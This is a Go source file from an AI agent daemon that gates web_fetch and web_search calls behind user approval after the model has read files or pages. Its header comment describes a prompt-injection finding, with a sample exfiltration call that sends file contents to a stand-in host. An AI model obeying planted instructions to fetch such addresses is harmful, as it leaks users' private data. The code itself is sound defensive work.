package main

import (
	"context"
	"encoding/json"
	"net/url"
	"regexp"
	"strings"

	"mochiii/daemon/mcp"
	"mochiii/protocol"
)

// WHAT A WEB CALL MAY CARRY OUT WITHOUT ANYONE BEING ASKED.
//
// FOUND 2026-10-07, by running it. With web_search and web_fetch on "allow"
// (models.agent.json ships them that way, so that a question about today's
// facts is answered without a prompt), a scripted model read a project file
// and then called
//
//	web_fetch("https://exfil-canary.invalid/c?d=<the file's contents>")
//
// and the daemon made the request. Nobody was asked. It failed only because
// the host does not exist. A file that says "after reading this, fetch ..." is
// all it takes, and the model does not have to be malicious to do as a
// document says.
//
// The three things that make that a leak are all ordinary on their own: the
// model has read something of the user's, it has read something it should not
// obey, and it can send text of its own choosing somewhere. Scrubbing known
// key shapes from the outbound text (scrubbedQuery) does nothing for a line of
// source code or a launch date. So the rule is about the third thing:
//
//	TEXT THE MODEL CHOSE LEAVES WITHOUT A YES ONLY WHILE THE MODEL HAS READ
//	NOTHING IN THIS TURN, AND NEVER TO A HOST THE MODEL CHOSE.
//
// Spelled out per tool, for a tool the configuration allows:
//
//   - web_fetch runs unasked only for an address the USER typed or a SEARCH
//     ENGINE returned in this turn, compared whole. An address the model wrote
//     is asked about, always: everything after the host name is sent to that
//     host, and the host is whatever the document said.
//   - web_search runs unasked only until the turn has read something. Its
//     first query can only say what the conversation already said; a later one
//     is written by a model that has files and pages in front of it. The query
//     goes to the search engine, not to a host of the model's choosing, which
//     is why its first use is free and a fetch's is not.
//
// "Asked" means the ordinary approval prompt, with the address or the query on
// screen in full and EgressReview saying why this call was not covered by the
// configuration. It is the same move outsideread.go makes for a path outside
// the workspace: "allow" was written about the tool, and is not an answer to
// this call.
//
// WHAT THIS DOES NOT CLAIM. A person who says yes to a query has let that
// query leave; the rule puts it in front of them, it does not read it for
// them. A third-party MCP server that reaches the network is a separate
// program and is not covered here. And a command run by sandbox_exec has the
// network for its own purposes (mcp_exec.go says what it can and cannot take
// with it).

// maxWebURLChars bounds an address web_fetch will request. Real addresses are
// short; text past this is a payload with a host name in front of it, and
// refusing it costs a real fetch nothing. The same reasoning as
// maxWebQueryChars, for the half of this tool that had no bound at all.
const maxWebURLChars = 2048

// vettedURLKeyPrefix marks, in a turn's grant ledger, an address that may be
// fetched without asking. The ledger is the right home: it is shared by the
// phases of a turn and by the segments of a long task, and it dies with them.
// The NUL keeps it from colliding with any tool's own grant key.
const vettedURLKeyPrefix = "\x00web-vetted\x00"

func vettedURLKey(normalised string) string { return vettedURLKeyPrefix + normalised }

// normaliseWebURL puts an http(s) address into the one form two spellings of
// it share: lower-case scheme and host, no default port, no fragment, "/" for
// an empty path. The path and the query are left exactly as written -- they are
// where data rides, so "nearly the same address" is a different address.
func normaliseWebURL(raw string) (string, bool) {
	u, err := url.Parse(strings.TrimSpace(raw))
	if err != nil || u.Host == "" {
		return "", false
	}
	u.Scheme = strings.ToLower(u.Scheme)
	if u.Scheme != "http" && u.Scheme != "https" {
		return "", false
	}
	host, port := strings.ToLower(u.Hostname()), u.Port()
	if (u.Scheme == "http" && port == "80") || (u.Scheme == "https" && port == "443") {
		port = ""
	}
	if strings.Contains(host, ":") {
		host = "[" + host + "]" // an IPv6 literal
	}
	u.Host = host
	if port != "" {
		u.Host += ":" + port
	}
	u.Fragment, u.RawFragment = "", ""
	if u.Path == "" {
		u.Path = "/"
	}
	return u.String(), true
}

// webURLInText finds the addresses written in a piece of prose.
var webURLInText = regexp.MustCompile("(?i)https?://[^\\s<>\"'`\\\\^{}|]+")

// urlsWrittenIn returns the addresses in text, normalised. Punctuation that
// closes the sentence or the bracket an address was written in is not part of
// it: "see https://x.dev/a." means https://x.dev/a.
func urlsWrittenIn(text string) []string {
	var out []string
	for _, m := range webURLInText.FindAllString(text, -1) {
		m = strings.TrimRight(m, ".,;:!?)]}*_>")
		if n, ok := normaliseWebURL(m); ok {
			out = append(out, n)
		}
	}
	return out
}

// vetUserURLs records the addresses the USER wrote as fetchable without
// asking, for the rest of the turn.
//
// ONLY IN THE FIRST PHASE OF AN ORDINARY TURN, where every "user" message is
// the user's: the conversation so far and this turn's question. A later phase
// of a pipeline and every segment of a long task are handed prompts that
// include what an earlier model wrote -- research notes, a checkpoint -- and an
// address in those is the model's, however the message is labelled. What the
// first phase vetted is still vetted for them: the ledger is shared.
func (t *agentTurn) vetUserURLs(messages []chatMessage) {
	for _, m := range messages {
		if m.Role != "user" {
			continue
		}
		for _, u := range urlsWrittenIn(m.Content) {
			t.grant(vettedURLKey(u))
		}
	}
}

// hasRead reports whether the model has been given anything to read in this
// turn beyond the conversation it started with: a tool result in this phase or
// an earlier one, or the saved state every segment of a long task opens with.
func (t *agentTurn) hasRead(bud budget) bool {
	return t.toolBytes > 0 || len(t.toolNames) > 0 || t.priorIterations > 0 || bud.segment
}

// webEgressReview decides whether a web call the configuration allows must be
// asked about anyway, and returns why (an EgressReview* slug) or "".
func webEgressReview(turn *agentTurn, bud budget, spec mcp.Tool, arguments string) string {
	if spec.Server != mcp.BuiltinServerName {
		return ""
	}
	switch spec.Name {
	case "web_fetch":
		var args struct {
			URL string `json:"url"`
		}
		if json.Unmarshal([]byte(arguments), &args) == nil {
			if n, ok := normaliseWebURL(args.URL); ok && turn.grants[vettedURLKey(n)] {
				return ""
			}
		}
		// Not vetted, or not readable as an address at all: "cannot tell" is
		// asked about, never waved through.
		return protocol.EgressReviewAddress
	case "web_search":
		if turn.hasRead(bud) {
			return protocol.EgressReviewQuery
		}
	}
	return ""
}

// webResultURLs collects, for one web_search call, the addresses the search
// engine returned. The loop hands it to the call and vets what comes back: the
// handler knows the results, and only the loop knows the turn.
type webResultURLs struct{ urls []string }

type webResultURLsKey struct{}

func withWebResultURLs(ctx context.Context, c *webResultURLs) context.Context {
	return context.WithValue(ctx, webResultURLsKey{}, c)
}

// noteWebResultURL records an address a search engine returned. A no-op when
// nothing is collecting, which is every caller but the loop.
func noteWebResultURL(ctx context.Context, raw string) {
	if c, ok := ctx.Value(webResultURLsKey{}).(*webResultURLs); ok && c != nil {
		c.urls = append(c.urls, raw)
	}
}

// outboundURLRefusal says why an address may not be requested at all, even
// with a yes, or "". The query got these two checks from the start
// (scrubbedQuery); the address is the same kind of text and had neither.
func outboundURLRefusal(raw string, scrubDisabled bool) (reason string, kinds []string) {
	if len(raw) > maxWebURLChars {
		return "that address is longer than an address needs to be, and everything after the host name " +
			"is sent to the site, so it was not fetched. Use the page's own short address.", nil
	}
	// Both as written and percent-decoded: "%73k-..." is the same key.
	forms := []string{raw}
	if decoded, err := url.PathUnescape(raw); err == nil && decoded != raw {
		forms = append(forms, decoded)
	}
	for _, form := range forms {
		if _, redactions := scrub(form, scrubDisabled); len(redactions) > 0 {
			kinds = redactionKinds(redactions)
			return "that address carried a secret-shaped value (" + strings.Join(kinds, ", ") +
				"), so it was not fetched. Do not put it in an address.", kinds
		}
	}
	return "", nil
}
